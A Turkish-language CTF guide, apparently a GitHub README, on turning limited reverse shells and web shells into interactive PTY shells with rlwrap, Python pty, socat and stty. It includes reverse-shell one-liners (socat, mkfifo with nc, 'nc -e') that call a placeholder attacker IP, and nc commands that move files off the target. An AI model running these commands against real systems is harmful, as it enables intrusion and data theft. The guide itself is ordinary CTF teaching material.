# CTF Shell Deneyimi Geliştirme ve Yönetme Rehberi

Bu rehber, CTF (Capture The Flag) yarışmalarında elde edilen ters bağlantı (reverse shell) veya web shell gibi kısıtlı shell'lerde kullanıcı deneyimini artırmak, işlevselliği yükseltmek ve genel verimliliği sağlamak için kullanılan çeşitli teknikleri ve araçları kapsamaktadır. Amacımız, "dumb" shell'lerden tam işlevsel, interaktif shell'lere geçiş yapmanıza yardımcı olmaktır.

**Neden Bu Rehber?**

CTF'lerde bir sisteme ilk erişimi sağladığınızda genellikle çok temel, satır düzenleme, geçmiş veya tamamlama gibi özelliklerden yoksun bir shell ile karşılaşırsınız. Bu durum, komutları yazmayı, hataları düzeltmeyi ve genel olarak hedef sistemde gezinmeyi zorlaştırır. Bu rehberdeki teknikler, bu kısıtlamaların üstesinden gelmenize yardımcı olacaktır.

## İçindekiler

1.  [Temel Kavramlar](#1-temel-kavramlar)
    *   [Dumb Shell nedir?](#dumb-shell-nedir)
    *   [PTY (Pseudo-Terminal) nedir?](#pty-pseudo-terminal-nedir)
    *   [Neden Shell Yükseltme (Upgrading)?](#neden-shell-yükseltme-upgrading)
2.  [Yerel (Saldırgan) Tarafta Deneyimi Geliştirme: `rlwrap`](#2-yerel-saldırgan-tarafta-deneyimi-geliştirme-rlwrap)
    *   [`rlwrap` Kurulumu](#rlwrap-kurulumu)
    *   [Temel `rlwrap` Kullanımı](#temel-rlwrap-kullanımı)
    *   [Önemli `rlwrap` Seçenekleri](#önemli-rlwrap-seçenekleri)
    *   [Tavsiye Edilen `rlwrap` Kullanımı](#tavsiye-edilen-rlwrap-kullanımı)
3.  [Hedef Tarafta Shell Yükseltme Teknikleri](#3-hedef-tarafta-shell-yükseltme-teknikleri)
    *   [Adım 1: PTY (Pseudo-Terminal) Oluşturma](#adım-1-pty-pseudo-terminal-oluşturma)
        *   [Python ile PTY](#python-ile-pty)
        *   [`script` Komutu ile PTY](#script-komutu-ile-pty)
        *   [`socat` ile PTY](#socat-ile-pty)
        *   [Diğer Diller/Araçlar ile PTY](#diğer-dilleraraçlar-ile-pty)
    *   [Adım 2: Kendi Terminalimizi Ayarlama (Saldırgan Taraf)](#adım-2-kendi-terminalimizi-ayarlama-saldırgan-taraf)
    *   [Adım 3: Hedef Shell'i Ayarlama](#adım-3-hedef-shelli-ayarlama)
    *   [Tam Yükseltme Akışı (Özet)](#tam-yükseltme-akışı-özet)
4.  [İleri Düzey Teknikler ve İpuçları](#4-i̇leri-düzey-teknikler-ve-i̇puçları)
    *   [`socat` ile Tamamen İnteraktif Shell'ler](#socat-ile-tamamen-i̇nteraktif-shelller)
    *   [Web Shell'leri Yükseltme](#web-shellleri-yükseltme)
    *   [`tmux` veya `screen` Kullanımı](#tmux-veya-screen-kullanımı)
    *   [Dosya Transferi İçin Hızlı Yöntemler](#dosya-transferi-i̇çin-hızlı-yöntemler)
    *   [Sık Kullanılan `stty` Ayarları](#sık-kullanılan-stty-ayarları)
5.  [Sorun Giderme](#5-sorun-giderme)
    *   [`Ctrl+C`, `Ctrl+D`, `Ctrl+Z` Çalışmıyor](#ctrlc-ctrld-ctrlz-çalışmıyor)
    *   [Terminal Ekranı Bozuluyor / Garip Karakterler](#terminal-ekranı-bozuluyor--garip-karakterler)
    *   [Komutlar Çift Görünüyor veya Hiç Görünmüyor](#komutlar-çift-görünüyor-veya-hiç-görünmüyor)
6.  [Faydalı Tek Satırlıklar (One-Liners)](#6-faydalı-tek-satırlıklar-one-liners)
7.  [Katkıda Bulunma](#7-katkıda-bulunma)
8.  [Lisans](#8-lisans)

---

## 1. Temel Kavramlar

### Dumb Shell nedir?
"Dumb" (aptal) shell, genellikle `netcat`, `telnet` gibi araçlarla veya basit ters bağlantı payload'ları ile elde edilen, temel I/O (giriş/çıkış) yönlendirmesinden başka bir özelliği olmayan bir shell türüdür. Bu tür shell'lerde:
*   Komut geçmişi yoktur (yukarı/aşağı ok tuşları çalışmaz).
*   Satır içi düzenleme yoktur (sol/sağ ok, backspace, delete tuşları beklendiği gibi çalışmayabilir).
*   `Tab` ile otomatik tamamlama çalışmaz.
*   İş kontrolü (`Ctrl+C` ile işlemi durdurma, `Ctrl+Z` ile arka plana atma) düzgün çalışmayabilir veya tüm bağlantıyı sonlandırabilir.
*   Terminal penceresi yeniden boyutlandırıldığında düzgün tepki vermez.
*   `vim`, `nano`, `less` gibi tam ekran uygulamalar kullanılamaz.

### PTY (Pseudo-Terminal) nedir?
PTY (Sahte Terminal), bir programın (örneğin bir shell) sanki gerçek bir fiziksel terminale (TTY) bağlıymış gibi davranmasını sağlayan bir yazılım mekanizmasıdır. Modern Unix benzeri sistemlerde, terminal emülatörleri (örn: `xterm`, `gnome-terminal`) PTY'leri kullanarak kullanıcı ile shell arasında iletişim kurar. "Dumb" shell'leri "akıllı" hale getirmenin anahtarı, onlara bir PTY atamaktır.

### Neden Shell Yükseltme (Upgrading)?
Shell yükseltmenin temel amacı, kısıtlı bir "dumb" shell'i, kendi yerel terminalinizde kullandığınız gibi tam işlevsel, interaktif bir shell'e dönüştürmektir. Bu, CTF sırasında verimliliği önemli ölçüde artırır:
*   **Hızlı Komut Girişi ve Düzenleme:** Hataları kolayca düzeltme, komutları tekrar kullanma.
*   **İş Kontrolü:** Komutları `Ctrl+C` ile kesebilme, `Ctrl+Z` ile arka plana atabilme.
*   **Tam Ekran Uygulamalar:** `vim`, `nano`, `less`, `top`, `htop` gibi araçları kullanabilme.
*   **Otomatik Tamamlama:** (Shell'in kendi tamamlama mekanizması varsa) `Tab` tuşuyla komutları ve dosya yollarını tamamlayabilme.
*   **Daha İyi Görsel Deneyim:** Renkli çıktılar, doğru satır kaydırma ve ekran temizleme (`Ctrl+L`).

---

## 2. Yerel (Saldırgan) Tarafta Deneyimi Geliştirme: `rlwrap`

`rlwrap` (Readline Wrapper), komut satırı arayüzü olan ancak GNU Readline kütüphanesinin sunduğu özelliklere (satır düzenleme, geçmiş, tamamlama) sahip olmayan programlara bu özellikleri kazandıran bir yardımcı programdır. Özellikle `netcat` ile alınan ters bağlantılarda ilk müdahale için çok kullanışlıdır.

### `rlwrap` Kurulumu

Çoğu Linux dağıtımında paket yöneticisi ile kolayca kurulabilir:
```bash
# Debian/Ubuntu tabanlı sistemler
sudo apt-get update
sudo apt-get install rlwrap

# Fedora/CentOS/RHEL tabanlı sistemler
sudo dnf install rlwrap
# veya
sudo yum install rlwrap

# Arch Linux
sudo pacman -S rlwrap

# macOS (Homebrew ile)
brew install rlwrap
```

### Temel `rlwrap` Kullanımı

`rlwrap`'ı kullanmak için, sarmalamak istediğiniz komutun başına `rlwrap` yazmanız yeterlidir. Örneğin, `netcat` ile 8080 portunda dinleme yaparken:

```bash
rlwrap nc -lvnp 8080
```

Hedef makineden bağlantı geldiğinde, artık şunları yapabilirsiniz:
*   **Yukarı/Aşağı Ok Tuşları:** Komut geçmişinde gezinin.
*   **Sol/Sağ Ok Tuşları, Backspace, Delete:** Satır içi düzenleme yapın.
*   **Emacs Kısayolları:** `Ctrl+A` (satır başı), `Ctrl+E` (satır sonu), `Ctrl+U` (satırı sil), `Ctrl+K` (imleçten sonrasını sil), `Ctrl+W` (önceki kelimeyi sil).
*   **Ters Arama:** `Ctrl+R` ile geçmişte arama yapın.

### Önemli `rlwrap` Seçenekleri

`rlwrap -h` komutu tüm seçenekleri listeler. En sık kullanılanlar:

*   **`-A` / `--ansi-colour-aware`:** Hedef shell veya komutlar ANSI renk kodları üretiyorsa (örn: `ls --color=auto`), bu seçenek `rlwrap`'ın renkleri doğru işlemesine ve satır düzenlemesinin bozulmamasına yardımcı olur.
*   **`-c` / `--complete-filenames`:** `Tab` tuşuna basıldığında **sizin makinenizdeki** dosya ve dizin adlarını tamamlamaya çalışır. Unutmayın, bu hedef sistemin dosya sistemini değil, kendi yerel sisteminizi tamamlar.
*   **`-H <dosya>` / `--history-filename=<dosya>`:** Komut geçmişini belirtilen bir dosyaya kaydeder ve oradan yükler. Her CTF veya hedef için ayrı bir geçmiş dosyası tutmak için kullanışlıdır.
    ```bash
    rlwrap -H ~/.ctf_target_shell.history nc -lvnp 8080
    ```
*   **`-r` / `--remember`:** Genellikle `-H` ile birlikte kullanılır. Belirtilen geçmiş dosyasını başlangıçta yükler ve `rlwrap`'tan çıkarken kaydeder.
*   **`-s <N>` / `--histsize=<N>`:** Geçmişte tutulacak komut sayısını belirler.
*   **`-f <tamamlama_listesi>` / `--file=<tamamlama_listesi>`:** Kendi özel komut tamamlama listenizi içeren bir dosya belirtebilirsiniz. Bu dosya, her satırda bir komut veya kelime içermelidir. Hedef sistemde sık kullandığınız komutları buraya ekleyebilirsiniz.
    Örnek `my_completions.txt`:
    ```
    ls -la
    whoami
    id
    ifconfig
    ip addr
    find / -name
    grep -R
    ```
    Kullanımı: `rlwrap -f my_completions.txt nc -lvnp 8080`
*   **`-m[karakter]` / `--multi-line[=karakter]`:** Çok satırlı girişi etkinleştirir. Normalde Enter tuşu komutu gönderir. Bu seçenekle, satır sonunda ters eğik çizgi (`\`) gibi bir karakter kullanarak komutu bir sonraki satırda devam ettirebilirsiniz.

### Tavsiye Edilen `rlwrap` Kullanımı

Genel amaçlı iyi bir başlangıç komutu:
```bash
rlwrap -A -r -m -H ~/.cache/rlwrap_history_$(date +%F)_$(echo $RANDOM) nc -lvnp <PORT>
```
Bu komut:
*   ANSI renklerini destekler (`-A`).
*   Geçmişi hatırlar ve kaydeder (`-r`).
*   Çok satırlı girişi `\` ile destekler (`-m`).
*   Geçmişi tarih ve rastgele bir sayı içeren (çakışmaları önlemek için) dinamik bir dosyaya kaydeder (`-H`). `<PORT>` yerine dinlediğiniz portu yazın.

**Unutmayın:** `rlwrap` sadece sizin tarafınızdaki (saldırgan makine) giriş deneyimini iyileştirir. Hedefteki shell hala "dumb" olabilir. Tam işlevsellik için aşağıdaki "Shell Yükseltme Teknikleri" bölümüne bakın.

---

## 3. Hedef Tarafta Shell Yükseltme Teknikleri

`rlwrap` ile ilk bağlantıyı daha konforlu hale getirdikten sonra, hedef sistemdeki shell'i tam işlevsel bir PTY shell'ine yükseltmek istenir. Bu genellikle üç ana adımdan oluşur:

### Adım 1: PTY (Pseudo-Terminal) Oluşturma

Hedef sistemde, mevcut "dumb" shell'i bir PTY içine "spawn" etmemiz (doğurmamız) gerekir. Bu, genellikle hedefte bulunan yorumlayıcılar (Python, Perl, Ruby vb.) veya araçlar (`script`, `socat`) kullanılarak yapılır.

#### Python ile PTY
En yaygın ve genellikle en güvenilir yöntemlerden biridir.

*   **Python 3:**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
*   **Python 2:**
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
*   Eğer `/bin/bash` yoksa, `/bin/sh` veya sistemde bulduğunuz başka bir shell'i (`which sh`, `cat /etc/shells`) deneyin.

#### `script` Komutu ile PTY
`script` komutu genellikle sistemlerde bulunur ve bir PTY oluşturabilir.

```bash
script /dev/null -c /bin/bash
# veya daha sessiz:
script -q /dev/null -c /bin/bash
# Bazen /bin/bash yerine sadece /bin/sh gerekebilir:
script -q /dev/null /bin/sh
```

#### `socat` ile PTY
Eğer hedef sistemde `socat` yüklüyse, bu çok güçlü bir seçenektir. (Daha detaylı `socat` kullanımı için [İleri Düzey Teknikler](#socat-ile-tamamen-i̇nteraktif-shelller) bölümüne bakın).
Basit PTY spawn:
```bash
# Hedefte çalıştırılır (dışarıya bağlantı kurmaz, mevcut shell'i yükseltir)
# Bu komut doğrudan bir PTY spawn etmez, ama socat ile ters shell kurarken PTY oluşturulabilir.
# Doğrudan PTY için genellikle python/script kullanılır.
# Ancak, eğer bir nc shell'iniz varsa ve socat hedefte varsa, daha iyi bir socat shell'e geçebilirsiniz.
# nc shell içinde:
# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:<KENDI_IP>:<YENI_PORT>
# Kendi makinenizde yeni bir socat dinleyicisi açmanız gerekir:
# socat file:`tty`,raw,echo=0 tcp-listen:<YENI_PORT>
```

#### Diğer Diller/Araçlar ile PTY
Hedef sistemde Python veya `script` yoksa:
*   **Perl:**
    ```perl
    perl -e 'use IO::Pty; IO::Pty->new->spawn("/bin/bash");'
    # veya daha basit ama PTY olmayan:
    perl -e 'exec "/bin/sh";'
    ```
*   **Ruby:**
    ```ruby
    ruby -e 'require "pty"; PTY.spawn("/bin/bash")'
    ```
*   **expect (Tcl):**
    ```tcl
    expect -c 'spawn /bin/bash; interact'
    ```
*   **PHP (genellikle web shell üzerinden):**
    ```php
    // Bu tam bir PTY sağlamaz ama interaktif shell'e bir adımdır
    // exec("/bin/bash -i");
    // veya PTY spawn için Python/script'i exec ile çağırma
    // system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
    ```

**İpucu:** [PayloadsAllTheThings Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) adresinde birçok farklı dilde ters bağlantı ve PTY spawn etme örnekleri bulabilirsiniz.

### Adım 2: Kendi Terminalimizi Ayarlama (Saldırgan Taraf)

PTY'yi hedefte oluşturduktan sonra (örneğin Python ile), kendi yerel terminalimizin PTY ile düzgün iletişim kurabilmesi için bazı ayarlar yapmamız gerekir. Bu adımlar, `netcat` veya `rlwrap nc` dinleyicinizin olduğu terminalde yapılır.

1.  **PTY spawn komutunu hedefte çalıştırdıktan sonra:** Komut istemi kaybolabilir veya garip davranabilir. Bu normaldir.
2.  **`Ctrl+Z` tuşlarına basın:** Bu, mevcut `nc` (veya `rlwrap nc`) işlemini arka plana atar (suspend eder). Kendi yerel shell'inize dönersiniz.
3.  **`stty raw -echo` komutunu çalıştırın:**
    ```bash
    stty raw -echo; fg
    ```
    Bu komut:
    *   `stty raw`: Terminalinizi "raw" moda alır, yani tuş vuruşları (örn: `Ctrl+C`) doğrudan hedefteki PTY'ye gönderilir, yerel terminaliniz tarafından yorumlanmaz.
    *   `stty -echo`: Yazdığınız karakterlerin terminalinize geri yankılanmasını (echo) engeller. Hedefteki PTY zaten bunu yapacaktır, bu yüzden çift yankılanmayı önler.
    *   `fg`: Arka plana attığınız `nc` işlemini tekrar ön plana getirir. `Enter`'a basmanız gerekebilir, bazen iki kere, shell'in tekrar aktifleşmesi için.

### Adım 3: Hedef Shell'i Ayarlama

Şimdi, hedefteki (artık PTY içinde çalışan) shell'i daha da kullanılabilir hale getireceğiz. Bu komutları yükseltilmiş shell içinde çalıştırın.

1.  **(İsteğe Bağlı ama Önerilir) `reset`:**
    ```bash
    reset
    ```
    Bu komut, terminali sıfırlamaya çalışır ve bazen garip karakterleri veya ekran bozulmalarını düzeltebilir. `xterm` veya benzeri bir terminal tipi sorabilir, genellikle `xterm` seçmek yeterlidir.

2.  **Shell Türünü Ayarlama:**
    ```bash
    export SHELL=bash
    # veya zsh, sh vb. hangisi mevcut ve tercih ediliyorsa
    ```

3.  **`TERM` Değişkenini Ayarlama:**
    En önemli adımlardan biridir. Bu, hedefteki uygulamalara (örn: `vim`, `nano`) terminalinizin yeteneklerini bildirir.
    ```bash
    export TERM=xterm-256color
    # Diğer yaygın değerler: xterm, screen, screen-256color, tmux-256color
    # Kendi yerel terminalinizde `echo $TERM` komutunun çıktısına bakarak uygun bir değer seçebilirsiniz.
    ```
    Eğer `xterm-256color` sorun çıkarırsa, `xterm` veya `screen` deneyin.

4.  **Terminal Boyutunu Ayarlama (`stty`):**
    `Ctrl+L` (ekranı temizle) veya tam ekran uygulamalar (örn: `vim`) düzgün çalışmıyorsa, terminal boyutunu senkronize etmeniz gerekir.
    *   **Yeni bir yerel terminal sekmesi/penceresi açın.**
    *   Bu yeni terminalde `stty size` komutunu çalıştırın. Çıktısı `satır_sayısı sütun_sayısı` şeklinde olacaktır (örn: `24 80`).
        ```bash
        stty size
        # Örnek Çıktı: 24 80
        ```
    *   **Yükseltilmiş shell'inize (hedefteki) geri dönün.**
    *   Aşağıdaki komutu, kendi `stty size` çıktınızdaki değerlerle çalıştırın:
        ```bash
        stty rows 24 cols 80
        ```
    Artık `Ctrl+L` ve tam ekran uygulamalar düzgün çalışmalıdır.

### Tam Yükseltme Akışı (Özet)

1.  **Saldırgan:** `rlwrap nc -lvnp <PORT>` (veya tavsiye edilen `rlwrap` komutu)
2.  **Hedef:** (Ters bağlantı komutu çalıştırılır)
3.  **Hedef (Dumb Shell içinde):**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'  # Veya python, script vb.
    ```
4.  **Saldırgan (nc'nin çalıştığı terminalde):**
    *   `Ctrl+Z`
    *   `stty raw -echo; fg` (Enter'a basın, gerekirse tekrar Enter)
5.  **Hedef (Artık daha iyi olan PTY shell'de):**
    *   (İsteğe bağlı) `reset` (ve sorarsa `xterm` yazın)
    *   `export SHELL=bash`
    *   `export TERM=xterm-256color` (veya kendi terminalinize uygun bir değer)
    *   (Yeni bir yerel terminalde `stty size` ile boyutları öğrenin)
    *   `stty rows <satır_sayısı> cols <sütun_sayısı>`

Artık `Tab` ile tamamlama (bash/zsh'de), `Ctrl+C`, `Ctrl+L`, ok tuşları, `vim`/`nano` gibi araçlar çalışmalıdır!

---

## 4. İleri Düzey Teknikler ve İpuçları

### `socat` ile Tamamen İnteraktif Shell'ler

Eğer hem saldırgan hem de hedef makinede `socat` varsa, çok daha stabil ve doğrudan interaktif shell'ler elde edebilirsiniz. Bu yöntem genellikle PTY spawn + `stty` ayarlarını tek adımda halleder.

**Saldırgan (Dinleyici):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<SOCAT_PORT>
```
*   `file:\`tty\``: Kendi terminalinizi (`tty`) `socat` için dosya olarak kullanır.
*   `raw,echo=0`: `stty raw -echo` ile aynı işlevi görür.

**Hedef (Bağlantı Kuran - mevcut shell içinden çalıştırılır):**
```bash
# Hedefte socat varsa
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<SALDIRGAN_IP>:<SOCAT_PORT>
# veya daha basit bir varyant:
# socat tcp:<SALDIRGAN_IP>:<SOCAT_PORT> exec:'bash -li',pty,stderr
```
*   `exec:'bash -li'`: İnteraktif (`-i`) ve login shell (`-l`) olarak `bash` çalıştırır.
*   `pty`: Bir pseudo-terminal ayırır.
*   `stderr`: Standart hatayı da yönlendirir.
*   `setsid`: Yeni bir oturumda çalıştırır.
*   `sigint`: `Ctrl+C` gibi sinyalleri PTY'ye iletir.
*   `sane`: Terminali "sağlıklı" (sane) ayarlara getirir.

Bu yöntemle, genellikle `rlwrap`'a bile gerek kalmaz, ancak isterseniz `socat` dinleyicinizi de `rlwrap` ile sarmalayabilirsiniz.

### Web Shell'leri Yükseltme

Eğer erişiminiz bir web shell (örneğin, PHP, ASPX, JSP web shell) üzerinden ise, önce bu web shell'i kullanarak bir ters bağlantı (reverse shell) elde etmeniz gerekir. Ardından yukarıdaki `rlwrap` ve PTY yükseltme tekniklerini uygulayabilirsiniz.

**Örnek: PHP Web Shell'den `netcat` ile Ters Bağlantı**
Web shell'in komut çalıştırma arayüzüne şunu yazın (IP ve Port'u kendinize göre değiştirin):
```bash
# nc.traditional veya OpenBSD nc (genellikle -e desteklemez)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SALDIRGAN_IP> <PORT> >/tmp/f

# nc (bazı versiyonları -e destekler)
nc -e /bin/bash <SALDIRGAN_IP> <PORT>
```
Saldırgan makinede `rlwrap nc -lvnp <PORT>` ile dinleyin. Bağlantı geldikten sonra PTY yükseltme adımlarına geçin.

### `tmux` veya `screen` Kullanımı

Hem saldırgan hem de (mümkünse) hedef tarafta `tmux` veya `screen` kullanmak, bağlantı kopmalarına karşı dayanıklılık sağlar ve oturumları yönetmeyi kolaylaştırır.

**Saldırgan Tarafta:**
Tüm `nc` veya `socat` dinleyicilerinizi bir `tmux` veya `screen` oturumu içinde başlatın.
```bash
tmux new -s ctf_session
# tmux içinde: rlwrap nc -lvnp <PORT>
# Ayrılmak için: Ctrl+b, d (detach)
# Tekrar bağlanmak için: tmux attach -t ctf_session
```

**Hedef Tarafta (Eğer Yüklüyse ve Çalıştırabiliyorsanız):**
Yükseltilmiş shell'e ulaştıktan sonra, hedefte `tmux` veya `screen` varsa, komutlarınızı bunun içinde çalıştırmak da stabiliteyi artırabilir.
```bash
# Yükseltilmiş shell içinde
screen -S work
# veya
tmux new -s work
```

### Dosya Transferi İçin Hızlı Yöntemler
Yükseltilmiş bir shell, dosya transferini kolaylaştırır.

*   **Python HTTP Sunucusu (Dosya İndirme):**
    *   **Hedef** (dosyaların olduğu dizinde):
        *   Python 3: `python3 -m http.server 8000`
        *   Python 2: `python -m SimpleHTTPServer 8000`
    *   **Saldırgan:** Tarayıcıdan `http://<HEDEF_IP>:8000` veya `wget http://<HEDEF_IP>:8000/dosya_adi`
*   **`nc` (Netcat) ile Dosya Transferi:**
    *   **Saldırgan (Dosya Alıcı):** `nc -lvnp <PORT> > gelen_dosya.txt`
    *   **Hedef (Dosya Gönderici):** `nc <SALDIRGAN_IP> <PORT> < gonderilecek_dosya.txt`
    *   Ters yönde de çalışır.
*   **Base64 Kodlama/Çözme (Küçük Dosyalar):**
    *   **Saldırgan (Gönderme):** `cat dosya.txt | base64 -w0` (çıktıyı kopyala)
    *   **Hedef (Alma):** `echo "<KOPYALANAN_BASE64_STRING>" | base64 -d > dosya.txt`
*   **`wget` / `curl` (Hedefte Dosya İndirme):**
    *   **Saldırgan** (dosyaların olduğu dizinde Python HTTP sunucusu başlatın)
    *   **Hedef:** `wget http://<SALDIRGAN_IP>:8000/dosya_adi -O /tmp/dosya_adi`
    *   **Hedef:** `curl http://<SALDIRGAN_IP>:8000/dosya_adi -o /tmp/dosya_adi`

### Sık Kullanılan `stty` Ayarları
*   `stty -a`: Mevcut tüm terminal ayarlarını gösterir.
*   `stty sane`: Terminali "sağlıklı" varsayılan ayarlara döndürmeye çalışır.
*   `stty size`: Terminalin satır ve sütun sayısını verir.
*   `stty rows <N> cols <M>`: Terminal boyutunu ayarlar.
*   `stty raw`: Ham modu etkinleştirir.
*   `stty -raw` (veya `stty cooked`): Ham modu devre dışı bırakır.
*   `stty echo`: Yazılan karakterlerin ekranda görünmesini sağlar.
*   `stty -echo`: Yazılan karakterlerin ekranda görünmesini engeller.
*   `stty ixon`: `Ctrl+S` (akışı durdur) ve `Ctrl+Q` (akışı devam ettir) yazılım akış kontrolünü etkinleştirir. Bazen `Ctrl+S`'e yanlışlıkla basıldığında terminalin donmasına neden olabilir. `stty -ixon` ile devre dışı bırakılabilir.

---

## 5. Sorun Giderme

### `Ctrl+C`, `Ctrl+D`, `Ctrl+Z` Çalışmıyor
*   **Sebep:** Genellikle "dumb" shell'desiniz veya PTY tam olarak kurulmamış/ayarlanmamış. Sinyaller PTY'ye iletilmiyor.
*   **Çözüm:**
    1.  [Tam Yükseltme Akışı (Özet)](#tam-yükseltme-akışı-özet) adımlarını dikkatlice uygulayın.
    2.  Özellikle saldırgan tarafta `stty raw -echo` adımını atlamadığınızdan emin olun.
    3.  Hedefte PTY spawn komutunun (`python -c 'import pty...'` vb.) başarılı olduğundan emin olun, hata mesajı vermediğini kontrol edin.
    4.  `socat` ile tam interaktif shell yöntemini deneyin, bu genellikle sinyal yönetimini daha iyi yapar.
    5.  Eğer `Ctrl+C` shell'i tamamen kapatıyorsa, PTY spawn etmeden önce shell'in kendisi sinyalleri yakalıyor olabilir. PTY spawn ettikten sonra sinyallerin PTY içindeki programa gitmesi gerekir.

### Terminal Ekranı Bozuluyor / Garip Karakterler
*   **Sebep:** `TERM` değişkeni yanlış ayarlanmış olabilir, terminal boyutu senkronize olmayabilir veya PTY ile ilgili bir sorun olabilir. Yanlış karakter kodlaması da bir etken olabilir.
*   **Çözüm:**
    1.  Yükseltilmiş shell içinde `reset` komutunu çalıştırın.
    2.  `export TERM=xterm` veya `export TERM=vt100` gibi daha temel bir `TERM` değeri deneyin.
    3.  Terminal boyutunu `stty rows <R> cols <C>` ile doğru şekilde ayarladığınızdan emin olun.
    4.  Eğer `rlwrap` kullanıyorsanız, `-A` (`--ansi-colour-aware`) seçeneğini ekleyip eklemediğinizi kontrol edin.
    5.  `LANG` ve `LC_ALL` gibi ortam değişkenlerini kontrol edin (`export LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8`).

### Komutlar Çift Görünüyor veya Hiç Görünmüyor
*   **Çift Görünme Sebebi:** Hem yerel terminaliniz hem de hedefteki PTY karakterleri yankılıyor.
    *   **Çözüm (Saldırgan Tarafı):** `stty raw -echo` komutunu çalıştırdığınızdan emin olun. Özellikle `-echo` kısmı önemlidir.
*   **Hiç Görünmeme Sebebi:** Yankılama (echo) tamamen kapalı veya PTY düzgün çalışmıyor.
    *   **Çözüm (Saldırgan Tarafı):** Eğer `stty raw -echo` sonrası hala sorun varsa, PTY spawn işleminde veya `fg` komutunda bir sorun olabilir. `stty sane` komutunu hem yerel (Ctrl+Z sonrası) hem de hedef shell'de deneyin.
    *   **Çözüm (Hedef Tarafı):** PTY spawn sonrası `stty echo` komutunu çalıştırmayı deneyin.

---

## 6. Faydalı Tek Satırlıklar (One-Liners)

*   **Hızlı Python PTY Spawn & Stty Ayarı (Saldırgan Tarafında Alias Olarak Eklenebilir):**
    ```bash
    # ~/.bashrc veya ~/.zshrc içine eklenebilir
    # alias upgrade_shell='(stty raw -echo; fg)'
    # Kullanımı: python pty spawn sonrası Ctrl+Z, sonra 'upgrade_shell'
    ```
*   **Hedefte Hızlı Shell Bilgisi:**
    ```bash
    whoami; id; uname -a; pwd; ls -la; ip addr; cat /etc/issue; cat /etc/shells
    ```
*   **Basit HTTP Sunucusu ile Dosya İndirme (Hedefte):**
    ```bash
    # Python 3
    TARGET_FILE="secret.txt"; PORT=8000; python3 -m http.server $PORT & WPID=$!; (sleep 1; echo "wget http://$(hostname -I | awk '{print $1}'):$PORT/$TARGET_FILE"; sleep 10; kill $WPID)
    # Python 2
    TARGET_FILE="secret.txt"; PORT=8000; python -m SimpleHTTPServer $PORT & WPID=$!; (sleep 1; echo "wget http://$(hostname -I | awk '{print $1}'):$PORT/$TARGET_FILE"; sleep 10; kill $WPID)
    ```
    Bu, dosyayı sunar ve size `wget` komutunu verir, 10 saniye sonra sunucuyu kapatır.

---

## 7. Katkıda Bulunma

Bu rehberin geliştirilmesine yardımcı olmak isterseniz:
*   Hataları bildirin (GitHub Issues).
*   Yeni teknikler, araçlar veya ipuçları önerin (GitHub Issues veya Pull Request).
*   Mevcut içeriği iyileştirin, netleştirin veya örnekleri çoğaltın (Pull Request).
*   Farklı işletim sistemleri veya shell türleri için özel ipuçları ekleyin.

---
